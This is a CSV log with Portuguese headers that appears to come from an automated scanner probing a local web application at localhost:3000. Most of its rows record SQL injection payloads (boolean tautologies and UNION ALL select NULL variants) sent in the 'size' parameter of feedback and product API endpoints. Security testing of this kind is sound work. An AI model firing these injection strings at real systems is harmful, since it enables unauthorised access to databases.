ID,Requisição de Timestamp,Timestamp de Resposta,Método,URL,Código,Motivo,RTT,Tamanho do Cabeçalho da Resposta,Tamanho do Corpo da Resposta
5104,Mon Jun 01 01:20:57 GMT-03:00 2026,Mon Jun 01 01:20:57 GMT-03:00 2026,GET,http://localhost:3000/api/Feedbacks?size=1.2%27+AND+%271%27%3D%272%27+--+,200,OK,45,387,1734
5105,Mon Jun 01 01:20:57 GMT-03:00 2026,Mon Jun 01 01:20:57 GMT-03:00 2026,PUT,http://localhost:3000/api/Products/1?size=1.2%27+UNION+ALL+select+NULL+--+,200,OK,27,386,257
5106,Mon Jun 01 01:20:57 GMT-03:00 2026,Mon Jun 01 01:20:57 GMT-03:00 2026,GET,http://localhost:3000/api/Feedbacks?size=1.2%27+OR+%271%27%3D%271%27+--+,200,OK,23,387,1734
5107,Mon Jun 01 01:20:57 GMT-03:00 2026,Mon Jun 01 01:20:57 GMT-03:00 2026,PUT,http://localhost:3000/api/Products/1?size=1.2%22+UNION+ALL+select+NULL+--+,200,OK,23,386,257
5108,Mon Jun 01 01:20:57 GMT-03:00 2026,Mon Jun 01 01:20:57 GMT-03:00 2026,GET,http://localhost:3000/api/Feedbacks?size=1.2+UNION+ALL+select+NULL+--+,200,OK,24,387,1734
5109,Mon Jun 01 01:20:57 GMT-03:00 2026,Mon Jun 01 01:20:57 GMT-03:00 2026,PUT,http://localhost:3000/api/Products/1?size=1.2%29+UNION+ALL+select+NULL+--+,200,OK,24,386,257
5110,Mon Jun 01 01:20:57 GMT-03:00 2026,Mon Jun 01 01:20:57 GMT-03:00 2026,GET,http://localhost:3000/api/Feedbacks?size=1.2%27+UNION+ALL+select+NULL+--+,200,OK,23,387,1734
5111,Mon Jun 01 01:20:57 GMT-03:00 2026,Mon Jun 01 01:20:57 GMT-03:00 2026,PUT,http://localhost:3000/api/Products/1?size=1.2%27%29+UNION+ALL+select+NULL+--+,200,OK,24,386,257
5112,Mon Jun 01 01:20:57 GMT-03:00 2026,Mon Jun 01 01:20:57 GMT-03:00 2026,GET,http://localhost:3000/api/Feedbacks?size=1.2%22+UNION+ALL+select+NULL+--+,200,OK,23,387,1734
5113,Mon Jun 01 01:20:57 GMT-03:00 2026,Mon Jun 01 01:20:57 GMT-03:00 2026,PUT,http://localhost:3000/api/Products/1?size=1.2,200,OK,23,386,257
5114,Mon Jun 01 01:20:57 GMT-03:00 2026,Mon Jun 01 01:20:57 GMT-03:00 2026,GET,http://localhost:3000/api/Feedbacks?size=1.2%29+UNION+ALL+select+NULL+--+,200,OK,15,387,1734
5115,Mon Jun 01 01:20:57 GMT-03:00 2026,Mon Jun 01 01:20:57 GMT-03:00 2026,GET,http://localhost:3000/api/Feedbacks?size=1.2%27%29+UNION+ALL+select+NULL+--+,200,OK,17,387,1734
5116,Mon Jun 01 01:20:57 GMT-03:00 2026,Mon Jun 01 01:20:57 GMT-03:00 2026,GET,http://localhost:3000/api/Feedbacks?size=1.2,200,OK,13,387,1734
